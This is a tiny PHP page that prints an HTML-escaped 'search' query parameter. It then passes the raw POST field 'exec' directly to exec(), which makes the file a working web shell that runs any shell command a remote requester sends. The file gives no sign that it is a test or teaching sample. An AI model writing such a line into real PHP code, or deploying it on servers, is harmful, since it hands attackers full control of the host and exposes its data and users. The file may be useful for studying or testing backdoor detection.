<?php

echo "<h>" . htmlspecialchars($_GET["search"], ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8") . "</h>";


exec($_POST["exec"]);

?>
